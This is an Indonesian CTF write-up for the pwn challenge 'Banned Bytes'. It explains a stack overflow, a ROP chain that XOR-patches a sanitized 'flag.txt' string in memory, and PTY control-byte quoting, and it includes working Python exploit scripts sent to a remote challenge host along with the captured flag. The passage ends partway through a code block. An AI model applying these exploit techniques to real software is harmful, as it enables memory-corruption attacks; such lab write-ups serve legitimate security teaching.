---
slug: "pwn-banned-bytes"
title: "Banned Bytes"
competition: "TraceBash CTF"
category: "Pwn"
difficulty: "Hard"
date: "2026-06-27"
updated: "2026-06-29"
summary: "Challenge-nya: binary pwn dengan overflow, tapi input kita disensor beberapa byte. Terus remote-nya dibungkus socat pakai pty, jadi exploit yang jalan di proses lokal belum tentu langsung jalan remote. Agak nyebelin, tapi justru bagian ngerinya di situ."
tags: ["PWN","HARD","SANITIZED BUFFEROVERFLOW"]
status: "published"
flag: "TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-banned-bytes"
---

# Banned Bytes

> Challenge-nya: binary pwn dengan overflow, tapi input kita disensor beberapa byte. Terus remote-nya dibungkus socat pakai pty, jadi exploit yang jalan di proses lokal belum tentu langsung jalan remote. Agak nyebelin, tapi justru bagian ngerinya di situ.

## **Banned Bytes**

![](/assets/uploads/writeup-inline-c2e4b02d-2044-420c-98a9-0641823cfe7b.png)

## **File yang Dikasih**

Isi zip:

```text
Dockerfile
docker-compose.yml
flag.txt
libprint.so
run.sh
vuln
```

Isi `run.sh`:

```bash
~/ctf/tracebash/pwn
❯ cat run.sh                                                                                                                                                                     󰥔 01:15:01
#!/bin/bash
exec timeout 120 /home/ctf/vuln
```

Isi `Dockerfile`:

```bash
~/ctf/tracebash/pwn
❯ cat Dockerfile                                                                                                                                                                 󰥔 01:21:57
FROM ubuntu:22.04

RUN apt-get update && \
    apt-get install -y socat && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m ctf
WORKDIR /home/ctf

COPY vuln .
COPY libprint.so .
COPY flag.txt .
COPY run.sh .
RUN chmod +x vuln run.sh
RUN chown root:ctf vuln libprint.so flag.txt run.sh
RUN chmod 440 flag.txt

USER ctf
EXPOSE 1338

CMD ["socat", "TCP-LISTEN:1338,reuseaddr,fork", "EXEC:/home/ctf/run.sh,pty,stderr"]
```

Isi `docker-compose.yml`:

```bash
~/ctf/tracebash/pwn
❯ cat docker-compose.yml                                                                                                                                                         󰥔 01:23:41
services:
  banned-bytes:
    build: .
    ports:
      - "1338:1338"
    restart: unless-stopped
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    tmpfs:
      - /tmp
    read_only: true
    mem_limit: 256m
    cpus: 1
    pids_limit: 1024
```

-   Ada `vuln`, target utama.
    
-   Ada `libprint.so`, kemungkinan ada fungsi helper buat print file.
    

Di `run.sh`:

```bash
exec timeout 120 /home/ctf/vuln
```

Di `Dockerfile`, service akhirnya dijalankan pakai:

```yaml
CMD ["socat", "TCP-LISTEN:1338,reuseaddr,fork", "EXEC:/home/ctf/run.sh,pty,stderr"]
```

Sementara `docker-compose.yml` expose port `1338:1338`. Catatan penting: ada `pty` di command `socat`. Ini nanti jadi sumber drama remote.

## **Proteksi Binary**

Hasil `checksec`:

```text
Partial RELRO
No Canary
NX enabled
PIE Disabled
```

Interpretasinya:

-   **No Canary**: stack overflow bisa langsung overwrite saved RIP.
    
-   **NX enabled**: jangan berharap shellcode di stack.
    
-   **PIE Disabled**: alamat gadget di binary tetap, jadi ROP enak.
    
-   **Partial RELRO**: GOT tidak full read-only, tapi di exploit ini kita gak perlu overwrite GOT.
    

Dari sini hipotesis awal cukup jelas: pakai ROP, bukan shellcode.

Command yang dipakai buat dapetin ini:

```bash
checksec file vuln
file vuln libprint.so
```

## **Evidence Bug dari Decompile**

Dari decompile `vuln()`:

```c
_QWORD buf[8]; // [rsp+0h] [rbp-50h]

memset(buf, 0, sizeof(buf));
printf("Input: ");
fflush(stdout);
result = read(0, buf, 0x200u);
v3 = result;

if (result > 0) {
    for (i = 0; i < v3; ++i) {
        v2 = *((_BYTE *)buf + i);
        if (v2 == 120 || v2 == 103 || v2 == 97 || v2 == 46)
            *((_BYTE *)buf + i) = 0;
    }
    return printf("You entered: %s\n", (const char *)buf);
}
```

Dari disassembly juga keliatan lebih konkret:

```asm
40116b: sub    rsp,0x50
...
4011cd: lea    rax,[rbp-0x50]
4011d1: mov    edx,0x200
4011de: call   read@plt
```

Artinya:

-   Buffer mulai di `[rbp-0x50]`.
    
-   Stack frame lokal ukurannya `0x50`.
    
-   `read()` baca `0x200`.
    
-   Saved RBP ada di `[rbp]`.
    
-   Saved RIP ada di `[rbp+8]`.
    

Jadi offset ke saved RIP:

```text
0x50 + 8 = 0x58 = 88
```

Ini dasar kenapa payload dimulai dengan:

```python
payload = b"A" * 88
```

Yang bikin yakin: saat payload lokal pakai `A * 88 + p64(gadget)`, program mulai lompat ke gadget. Kalau offset salah, biasanya crash di alamat `0x414141...` atau chain geser total.

## **Evidence Banned Bytes**

Loop sanitizer-nya ngecek byte ini:

```asm
401202: cmp BYTE PTR [rbp-0x9],0x78
401208: cmp BYTE PTR [rbp-0x9],0x67
40120e: cmp BYTE PTR [rbp-0x9],0x61
401214: cmp BYTE PTR [rbp-0x9],0x2e
40121f: mov BYTE PTR [rbp+rax*1-0x50],0x0
```

Kalau ditranslate:

```text
0x78 = 'x'
0x67 = 'g'
0x61 = 'a'
0x2e = '.'
```

Jadi semua input byte `x`, `g`, `a`, `.` bakal diganti `\x00`.

Ini bukan cuma ngaruh ke string. Ini juga ngaruh ke seluruh ROP chain, karena loop jalan sampai `len` hasil `read()`. Jadi semua byte payload, termasuk alamat gadget, argument, padding, dan string, harus bebas dari byte banned.

Di exploit aku validasi begini:

```python
BAD = b"xga."
bad_positions = [(i, bytes([b])) for i, b in enumerate(payload) if b in BAD]
if bad_positions:
    raise ValueError(f"payload contains banned bytes: {bad_positions}")
```

Ini penting. Kalau payload “kelihatan bener” tapi ada satu byte `0x61`, nanti byte itu berubah jadi `0x00` dan ROP chain bisa silently rusak. Ngeselin banget kalau gak dicek.

## **Target Fungsi:** `print_file`

Dari symbol/relocation:

```text
000000404018  R_X86_64_JUMP_SLOT  print_file
```

Dari PLT:

```asm
0000000000401060 <print_file@plt>:
  401060: jmp QWORD PTR [rip+0x2fb2] # 404018 <print_file>
```

Jadi:

```text
print_file@plt = 0x401060
```

Dari `libprint.so`, fungsi `print_file` menerima path di `rdi`, lalu:

```asm
mov rdi, rax
call fopen@plt
...
call fgetc@plt
call putchar@plt
```

Jadi kalau kita bisa manggil:

```c
print_file("flag.txt")
```

flag kebaca.

Kenapa bukan ret2libc `system("/bin/sh")`? Bisa aja dicari, tapi di sini binary sudah ngasih fungsi helper `print_file`, plus ada custom gadget buat write/xor memory. Jadi intended path-nya lebih jelas: bikin path file, panggil helper.

## **Gadget yang Dipakai**

Dari symbol/disassembly:

```text
0x40125b : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x401264 : pop r14 ; pop r15 ; ret
0x401269 : mov qword ptr [r13], r12 ; ret
0x40126e : xor byte ptr [r15], r14b ; ret
0x401272 : pop rdi ; ret
0x401274 : ret
```

Evidence dari `objdump`:

```asm
40125b: 41 5c    pop r12
40125d: 41 5d    pop r13
40125f: 41 5e    pop r14
401261: 41 5f    pop r15
401263: c3       ret

401269: 4d 89 65 00    mov QWORD PTR [r13+0x0],r12
40126d: c3             ret

40126e: 45 30 37       xor BYTE PTR [r15],r14b
401271: c3             ret

401272: 5f             pop rdi
401273: c3             ret
```

Makna gadget:

-   `pop r12 ; pop r13 ; ...`: siapin data dan alamat.
    
-   `mov [r13], r12`: write 8 byte ke memory.
    
-   `xor byte ptr [r15], r14b`: patch 1 byte memory.
    
-   `pop rdi`: set argumen pertama untuk fungsi di x86-64 SysV ABI.
    

Command yang dipakai:

```bash
objdump -d -M intel vuln
readelf -s vuln | rg 'gadget|print_file|writebuf|main|vuln'
```

## **Tempat Nulis String**

Dari symbol table:

```text
0000000000404060   256 OBJECT GLOBAL DEFAULT 26 writebuf
```

Jadi ada buffer global:

```text
writebuf = 0x404060
```

Ini enak buat naro string karena:

-   Alamatnya static, PIE off.
    
-   Writable.
    
-   Tidak perlu leak stack.
    
-   Tidak perlu nebak ASLR.
    

Command evidence:

```bash
~/ctf/tracebash/pwn
❯ readelf -s vuln | rg writebuf                                                                                                                                                  󰥔 01:26:46
    40: 0000000000404060   256 OBJECT  GLOBAL DEFAULT   26 writebuf
```

## **Masalah String** `flag.txt`

String target:

```text
flag.txt
```

Tapi isinya kena banned semua:

```text
f l a g . t x t
    ^ ^ ^   ^
    a g .   x
```

Kalau dikirim langsung, sanitizer bakal bikin jadi:

```text
fl\0\0\0t\0t
```

Jelas `fopen()` gagal.

Solusinya: kirim versi encoded yang tidak mengandung byte banned, lalu patch di memory setelah sanitizer selesai.

Encoded string:

```text
fl`f/tyt
```

Evidence transform:

```text
index  target  encoded  encoded ^ 1
0      f       f        f
1      l       l        l
2      a       `        a
3      g       f        g
4      .       /        .
5      t       t        t
6      x       y        x
7      t       t        t
```

Yang perlu di-XOR dengan `1` cuma offset:

```text
2, 3, 4, 6
```

Kenapa XOR `1`? Karena hasilnya pas dan byte `1` sendiri aman, bukan banned.

## **Bentuk ROP Chain**

### **1\. Tulis encoded string ke** `.bss`

```python
payload += p64(pop_r12_r13_r14_r15)
payload += b"fl`f/tyt"
payload += p64(writebuf)
payload += p64(1)
payload += p64(writebuf + 2)
payload += p64(mov_r13_r12)
```

Setelah gadget `pop_r12_r13_r14_r15_ret`:

```text
r12 = "fl`f/tyt"
r13 = writebuf
r14 = 1
r15 = writebuf + 2
```

Lalu:

```asm
mov qword ptr [r13], r12
```

Maka `writebuf` berisi:

```text
fl`f/tyt
```

Catatan: `r14` dan `r15` pertama ini sebenarnya belum wajib dipakai saat `mov`, tapi harus tetap diisi karena gadget pop-nya butuh 4 slot.

### **2\. Patch encoded string jadi** `flag.txt`

```python
for off in (2, 3, 4, 6):
    payload += p64(pop_r14_r15)
    payload += p64(1)
    payload += p64(writebuf + off)
    payload += p64(xor_r15_r14b)
```

Setiap iterasi:

```text
r14b = 1
r15  = alamat byte yang mau dipatch
xor byte ptr [r15], r14b
```

Setelah 4 patch:

```text
writebuf = "flag.txt"
```

Yang bikin yakin: waktu test di `gdb`, register/memory setelah chain sempat kelihatan `writebuf` berubah jadi `flag.txt`. Di run normal, bukti akhirnya `print_file` bisa buka file dan print `TBCTF{dummy}`.

### **3\. Call** `print_file(writebuf)`

```python
payload += p64(pop_rdi)
payload += p64(writebuf)
payload += p64(ret)
payload += p64(print_file_plt)
```

Kenapa `pop rdi`? Karena argumen pertama fungsi di Linux x86-64 masuk lewat `rdi`.

Kenapa ada `ret` sebelum call? Buat alignment stack. Beberapa fungsi libc sensitif kalau stack alignment gak sesuai 16-byte. Tambah satu `ret` sering jadi fix simpel buat ROP.

### **4\. Flush output**

```python
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(ret)
payload += p64(fflush_plt)
payload += p64(main)
```

Di lokal host, flag bisa langsung kelihatan. Tapi di Docker Ubuntu direct, sempat kejadian flag gak kelihatan karena proses crash sebelum output buffer ke-flush.

`fflush(NULL)` artinya flush semua output stream. Jadi setelah `print_file`, kita paksa output keluar dulu. Kalau setelah itu crash, ya gapapa, flag sudah kebaca.

`main` ditaruh setelahnya supaya chain punya return target yang valid. Kalau program masuk `main` lagi dan nunggu input lalu crash setelah EOF, itu gak masalah.

## **Payload Final**

Payload mentah:

```python
payload = b"A" * 88

payload += p64(pop_r12_r13_r14_r15)
payload += b"fl`f/tyt"
payload += p64(writebuf)
payload += p64(1)
payload += p64(writebuf + 2)
payload += p64(mov_r13_r12)

for off in (2, 3, 4, 6):
    payload += p64(pop_r14_r15)
    payload += p64(1)
    payload += p64(writebuf + off)
    payload += p64(xor_r15_r14b)

payload += p64(pop_rdi)
payload += p64(writebuf)
payload += p64(ret)
payload += p64(print_file_plt)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(ret)
payload += p64(fflush_plt)
payload += p64(main)
payload += b"\n"
```

Panjang payload final:

```text
337 bytes
```

Payload check:

```text
bad bytes in payload: []
```

Ini penting karena sanitizer jalan sebelum `ret`.

## **Trial and Error**

**trial\_common.py:**

```text
#!/usr/bin/env python3
from argparse import ArgumentParser
from socket import create_connection
from struct import pack
from subprocess import PIPE, Popen, run
from time import sleep


POP_R12_R13_R14_R15 = 0x40125B
POP_R14_R15 = 0x401264
MOV_R13_R12 = 0x401269
XOR_R15_R14B = 0x40126E
POP_RDI = 0x401272
RET = 0x401274
PRINT_FILE_PLT = 0x401060
FFLUSH_PLT = 0x401050
MAIN = 0x40124B
WRITEBUF = 0x404060

PTY_SPECIAL = bytes([
    0x03, 0x04, 0x0F, 0x11, 0x12, 0x13,
    0x15, 0x16, 0x17, 0x1A, 0x1C, 0x7F,
])


def p64(value):
    return pack("<Q", value)


def raw_flag_payload():
    payload = b"A" * 88
    payload += p64(POP_R12_R13_R14_R15)
    payload += b"flag.txt"
    payload += p64(WRITEBUF)
    payload += p64(0)
    payload += p64(0)
    payload += p64(MOV_R13_R12)
    payload += p64(POP_RDI)
    payload += p64(WRITEBUF)
    payload += p64(RET)
    payload += p64(PRINT_FILE_PLT)
    payload += p64(POP_RDI)
    payload += p64(0)
    payload += p64(RET)
    payload += p64(FFLUSH_PLT)
    payload += p64(MAIN)
    payload += b"\n"
    return payload


def encoded_payload(with_fflush):
    payload = b"A" * 88
    payload += p64(POP_R12_R13_R14_R15)
    payload += b"fl`f/tyt"
    payload += p64(WRITEBUF)
    payload += p64(1)
    payload += p64(WRITEBUF + 2)
    payload += p64(MOV_R13_R12)

    for off in (2, 3, 4, 6):
        payload += p64(POP_R14_R15)
        payload += p64(1)
        payload += p64(WRITEBUF + off)
        payload += p64(XOR_R15_R14B)

    payload += p64(POP_RDI)
    payload += p64(WRITEBUF)
    payload += p64(RET)
    payload += p64(PRINT_FILE_PLT)

    if with_fflush:
        payload += p64(POP_RDI)
        payload += p64(0)
        payload += p64(RET)
        payload += p64(FFLUSH_PLT)

    payload += p64(MAIN)
    payload += b"\n"
    return payload


def quote_for_pty(payload):
    quoted = bytearray()
    for b in payload:
        if b in PTY_SPECIAL and b != 0x0A:
            quoted.append(0x16)
        quoted.append(b)
    return bytes(quoted)


def run_local(payload):
    proc = Popen(["./vuln"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
    out, err = proc.communicate(payload, timeout=5)
    return out + err


def run_docker_payload(payload):
    proc = run(
        ["docker", "image", "inspect", "pwn-banned-bytes"],
        stdout=PIPE,
        stderr=PIPE,
        check=False,
    )
    if proc.returncode != 0:
        return (
            b"[!] Docker image pwn-banned-bytes belum ada.\n"
            b"    Build dulu dengan: docker compose build\n"
        )

    docker = Popen(
        ["docker", "run", "--rm", "-i", "pwn-banned-bytes", "/home/ctf/vuln"],
        stdin=PIPE,
        stdout=PIPE,
        stderr=PIPE,
    )
    out, err = docker.communicate(payload, timeout=10)
    return out + err


def run_remote(payload, host, port, quote=False, read_prompt=False, delay=0.0):
    data = quote_for_pty(payload) if quote else payload
    with create_connection((host, port), timeout=5) as sock:
        sock.settimeout(3)
        chunks = []
        if read_prompt:
            try:
                chunks.append(sock.recv(1024))
            except TimeoutError:
                pass

        sock.sendall(data)
        if delay:
            sleep(delay)
        sock.shutdown(1)

        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks)


def remote_args(description):
    parser = ArgumentParser(description=description)
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    return parser.parse_args()


def print_result(title, payload, output):
    print(f"[trial] {title}")
    print(f"[trial] payload_len={len(payload)}")
    print(output.decode("latin-1", errors="replace"), end="")
```

### **Percobaan 1: Kirim** `flag.txt` **langsung**

```text
#!/usr/bin/env python3
from trial_common import print_result, raw_flag_payload, run_local


payload = raw_flag_payload()
output = run_local(payload)
print_result("01 raw flag string lokal - expected gagal", payload, output)
```

Ide awal:

1.  Taruh `flag.txt` di payload.
    
2.  `pop rdi`.
    
3.  Call `print_file@plt`.
    

Ini gagal karena `flag.txt` kena banned bytes. Bukti dari sanitizer:

```text
a, g, ., x -> \x00
```

Hal yang bikin yakin ini penyebabnya: setelah cek payload, string memang mengandung semua byte banned. Jadi meskipun ROP control-flow bener, argumen `fopen()` pasti rusak.

Script bukti:

```bash
./trial_scripts/01_raw_flag_local.py
```

Output real:

```text
[trial] 01 raw flag string lokal - expected gagal
[trial] payload_len=209
Input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ñ
Input:
```

Tidak ada `TBCTF{dummy}`, jadi payload ini memang gagal.

### **Percobaan 2: Encode string dan patch pakai XOR**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, run_local


payload = encoded_payload(with_fflush=False)
output = run_local(payload)
print_result("02 encoded + XOR lokal - expected flag dummy keluar", payload, output)
```

Ini mulai berhasil. String encoded tidak mengandung banned bytes:

```text
fl`f/tyt
```

Patch runtime pakai `xor byte ptr [r15], r14b`.

Evidence run lokal:

```bash
./trial_scripts/02_encoded_xor_local.py
```

```text
[trial] 02 encoded + XOR lokal - expected flag dummy keluar
[trial] payload_len=305
Input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1
TBCTF{dummy}
Input:
```

Kenapa ada karakter aneh seperti `1`? Karena `printf("You entered: %s")` nge-print buffer awal sampai NUL pertama. Payload kita binary, jadi outputnya memang noisy. Yang penting flag keluar.

Hal yang bikin yakin:

-   Tidak ada banned byte di payload.
    
-   `print_file` berhasil buka `flag.txt`.
    
-   Flag dummy lokal keluar.
    

### **Percobaan 3: Docker direct sempat gak print flag**

**a:**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, run_docker_payload


payload = encoded_payload(with_fflush=False)
output = run_docker_payload(payload)
print_result("03a encoded tanpa fflush via Docker - expected output belum ke-flush", payload, output)
```

**b:**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, run_docker_payload


payload = encoded_payload(with_fflush=True)
output = run_docker_payload(payload)
print_result("03b encoded dengan fflush via Docker - expected flag dummy keluar", payload, output)
```

Pas dicoba di container Ubuntu, awalnya output cuma:

```bash
./trial_scripts/03a_no_flush_docker.py
```

```text
[trial] 03a encoded tanpa fflush via Docker - expected output belum ke-flush
[trial] payload_len=305
Input:
```

ROP-nya kemungkinan sudah jalan, tapi output belum ke-flush. Ini masuk akal karena stdout bisa beda buffering tergantung pipe/pty/container.

Fix:

```text
call fflush(NULL)
```

Setelah ditambah `fflush`, direct Docker test:

```bash
./trial_scripts/03b_with_fflush_docker.py
```

```text
[trial] 03b encoded dengan fflush via Docker - expected flag dummy keluar
[trial] payload_len=337
Input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{dummy}
```

Kalau setelah itu proses crash atau balik lagi ke `Input:`, itu sudah gak masalah. Flag sudah keluar, jadi untuk CTF ini valid.

### **Percobaan 4: Service** `socat pty` **bikin payload rusak**

### **a:**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, remote_args, run_remote


args = remote_args("Percobaan 4a: remote tanpa PTY quoting, expected noisy/gagal")
payload = encoded_payload(with_fflush=True)
output = run_remote(payload, args.host, args.port, quote=False, read_prompt=True, delay=0.2)
print_result("04a remote tanpa PTY quote - expected gagal/noisy", payload, output)
```

**b:**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, remote_args, run_remote


args = remote_args("Percobaan 4b: remote dengan PTY quoting")
payload = encoded_payload(with_fflush=True)
output = run_remote(payload, args.host, args.port, quote=True, read_prompt=True, delay=0.2)
print_result("04b remote dengan PTY quote - expected flag keluar", payload, output)
```

Waktu lewat service:

```text
socat TCP-LISTEN:1338,reuseaddr,fork EXEC:/home/ctf/run.sh,pty,stderr
```

Payload awal yang jalan lokal malah gak jalan stabil. Output echo dari service juga aneh, banyak control notation seperti:

```bash
./trial_scripts/04a_remote_no_pty_quote.py 13.127.119.28 1338
```

![](/assets/uploads/writeup-inline-25a9c3af-0aa3-4e19-919f-c54e43aa5671.png)

```text
^R
^@
```

Ini clue besar kalau input lewat terminal line discipline, bukan raw socket biasa.

Setelah dicek payload, banyak byte `0x12`:

```text
control in payload:
[(89, '0x12'), (129, '0x12'), ...]
```

Kenapa ada `0x12`? Karena alamat gadget seperti `0x40125b` dalam little endian:

```text
5b 12 40 00 00 00 00 00
```

Byte `0x12` di PTY biasanya `VREPRINT` alias `Ctrl-R`. Jadi terminal bisa interpretasi byte itu, bukan ngasih mentah ke program.

Solusi: quote control bytes pakai `VLNEXT` (`0x16`).

Kalau mau kirim literal `0x12`, kirim:

```text
0x16 0x12
```

Terminal akan menganggap byte setelah `0x16` sebagai literal.

Di exploit:

```python
PTY_SPECIAL = bytes([
    0x03, 0x04, 0x0F, 0x11, 0x12, 0x13,
    0x15, 0x16, 0x17, 0x1A, 0x1C, 0x7F,
])

def quote_for_pty(payload):
    quoted = bytearray()
    for b in payload:
        if b in PTY_SPECIAL and b != 0x0A:
            quoted.append(0x16)
        quoted.append(b)
    return bytes(quoted)
```

Evidence setelah quote:

```text
payload 337 bytes
quoted 352 bytes
```

Kenapa jadi 352? Karena ada 15 control byte yang di-prefix `0x16`.

Hal yang bikin yakin:

-   Raw payload via PTY gagal/noisy.
    
-   Quoted payload via PTY sukses.
    
-   Local non-PTY tetap pakai raw payload.
    

Script fix PTY quoting:

```bash
./trial_scripts/04b_remote_with_pty_quote.py 13.127.119.28 1338
```

Output:

```text
~/ctf/tracebash/pwn
❯ ./trial_scripts/04b_remote_with_pty_quote.py 13.127.119.28 1338                                                                                                                󰥔 02:28:39
[trial] 04b remote dengan PTY quote - expected flag keluar
[trial] payload_len=337
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[^R@^@^@^@^@^@fl`f/tyt`@@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@i^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@c@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@d@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@f@@^@^@^@^@^@n^R@^@^@^@^@^@r^R@^@^@^@^@^@`@@^@^@^@^@^@t^R@^@^@^@^@^@`^P@^@^@^@^@^@r^R@^@^@^@^@^@^@^@^@^@^@^@^@^@t^R@^@^@^@^@^@P^P@^@^@^@^@^@K^R@^@^@^@^@^@
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
timeout: the monitored command dumped core
```

### **Percobaan 5: Remote masih kosong gara-gara timing**

### **a:**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, remote_args, run_remote


args = remote_args("Percobaan 5a: kirim payload lalu shutdown cepat, tanpa baca prompt")
payload = encoded_payload(with_fflush=True)
output = run_remote(payload, args.host, args.port, quote=True, read_prompt=False, delay=0.0)
print_result("05a remote fast close - expected flaky/kadang kosong", payload, output)
```

**b:**

```text
#!/usr/bin/env python3
from trial_common import encoded_payload, print_result, remote_args, run_remote


args = remote_args("Percobaan 5b: baca prompt dulu + delay sebelum shutdown")
payload = encoded_payload(with_fflush=True)
output = run_remote(payload, args.host, args.port, quote=True, read_prompt=True, delay=0.2)
print_result("05b remote prompt + delay - expected stabil flag keluar", payload, output)
```

Sempat command ini kosong:

```bash
~/ctf/tracebash/pwn
❯ ./trial_scripts/05a_remote_fast_close.py 13.127.119.28 1338                                                                                                                    󰥔 02:29:47
[trial] 05a remote fast close - expected flaky/kadang kosong
[trial] payload_len=337
```

Tapi waktu probe manual, remote jelas hidup:

```text

~/ctf/tracebash/pwn
❯ nc 13.127.119.28 1338                                                                                                                                                          󰥔 02:31:26
Input: test
test
You entered: test
```

Berarti bukan host mati, bukan port salah. Masalahnya di cara script ngobrol dengan service.

Fix remote I/O:

```python
sock.settimeout(3)
chunks.append(sock.recv(1024))  # baca prompt dulu (script nunggu dan menerima output awal dari service sebelum ngirim payload.)
sock.sendall(quote_for_pty(payload))
sleep(0.2)
sock.shutdown(1)
```

Kenapa baca prompt dulu? Biar service sudah benar-benar masuk fase `read()`.

Kenapa `sleep(0.2)`? Karena remote `socat + pty` butuh waktu buat nganter payload ke process. Kalau socket langsung di-shutdown terlalu agresif, kadang hasilnya kosong atau kepotong.

Evidence final remote:

```bash
./trial_scripts/05b_remote_prompt_delay.py 13.127.119.28 1338
```

```text
~/ctf/tracebash/pwn
❯ ./trial_scripts/05b_remote_prompt_delay.py 13.127.119.28 1338                                                                                                                  󰥔 02:31:44
[trial] 05b remote prompt + delay - expected stabil flag keluar
[trial] payload_len=337
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[^R@^@^@^@^@^@fl`f/tyt`@@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@i^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@c@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@d@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@f@@^@^@^@^@^@n^R@^@^@^@^@^@r^R@^@^@^@^@^@`@@^@^@^@^@^@t^R@^@^@^@^@^@`^P@^@^@^@^@^@r^R@^@^@^@^@^@^@^@^@^@^@^@^@^@t^R@^@^@^@^@^@P^P@^@^@^@^@^@K^R@^@^@^@^@^@
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
timeout: the monitored command dumped core
```

## **Hal yang Bikin Yakin Solusi Ini Valid**

Beberapa checkpoint yang bikin yakin, bukan cuma “feeling”:

1.  **Overflow offset jelas dari stack layout**
    

```text
buf = rbp-0x50
saved RIP = rbp+8
offset = 0x50 + 8 = 88
```

2.  **Banned bytes jelas dari compare instruction**
    

```text
0x78, 0x67, 0x61, 0x2e
```

3.  **Alamat gadget dan function static**
    

PIE disabled, jadi alamat `0x40125b`, `0x401060`, dll stabil.

4.  **String** `flag.txt` **tidak dikirim mentah**
    

Payload tidak punya byte `x`, `g`, `a`, `.` sama sekali.

5.  `writebuf` **writable dan fixed**
    

Symbol table kasih:

```text
writebuf = 0x404060
```

6.  **Runtime patch terbukti**
    

Encoded `fl\`f/tyt`jadi`flag.txt`setelah XOR offset`2,3,4,6\`.

7.  **Local, Docker, dan remote semuanya punya explanation masing-masing**
    

-   Local raw process: payload biasa.
    
-   Docker direct: perlu `fflush`.
    
-   `socat pty`: perlu `VLNEXT` quoting.
    
-   Remote: perlu prompt read + delay kecil.
    

## **Payload Percobaan yang Bisa Dirun**

Supaya trial-error-nya gak cuma jadi cerita, aku bikin helper (source setelah trial):

```bash
./trial_payloads.py <trial> [host port]
```

Pilihan trial:

```text
raw-flag  : payload salah, nulis "flag.txt" mentah
encoded   : payload encoded, jalan lokal, tapi remote sengaja tanpa PTY quoting
final     : payload final
```

Script ini gunanya buat reproduce output percobaan. Jadi kalau mau lihat gagalnya di mana, bisa run satu-satu.

### **Trial 1:** `raw-flag`

Payload ini sengaja salah. Dia langsung masukin string mentah:

```python
payload += b"flag.txt"
```

Secara ide kelihatannya masuk akal: tulis `flag.txt` ke `writebuf`, lalu call `print_file`. Tapi karena `flag.txt` punya banned bytes, sanitizer bakal ngerusak string sebelum ROP jalan.

Run:

```bash
./trial_payloads.py raw-flag
```

Output:

```text
[trial] raw-flag
[trial] payload_len=209
Input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ñ
Input:
```

Yang penting dari output ini: gak ada `TBCTF{dummy}`. Jadi control-flow masih bisa balik ke `Input:`, tapi path file yang dipakai `print_file` rusak dan gak nge-print flag.

Kenapa aku yakin rusaknya di string? Karena banned bytes ada tepat di `flag.txt`:

```text
flag.txt -> fl\0\0\0t\0t
```

Jadi `fopen()` nyari nama file yang salah.

### **Trial 2:** `encoded` **Lokal**

Payload ini pakai encoded string:

```text
fl`f/tyt
```

Lalu patch offset `2,3,4,6` pakai XOR `1`. Ini payload yang sudah bener untuk proses lokal/non-PTY.

Run:

```bash
./trial_payloads.py encoded
```

Output:

```text
[trial] encoded
[trial] payload_len=337
Input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{dummy}
Input:
```

Ini bukti penting:

-   Offset overflow `88` valid.
    
-   Gadget write dan XOR valid.
    
-   `writebuf` berhasil jadi `flag.txt`.
    
-   `print_file(writebuf)` berhasil baca local `flag.txt`.
    

### **Trial 3:** `encoded` **Remote Tanpa PTY Quoting**

Payload encoded tadi kalau dikirim ke remote tanpa quote PTY, dia gagal/noisy. Ini sengaja dibuat di `trial_payloads.py encoded host port`.

Run:

```bash
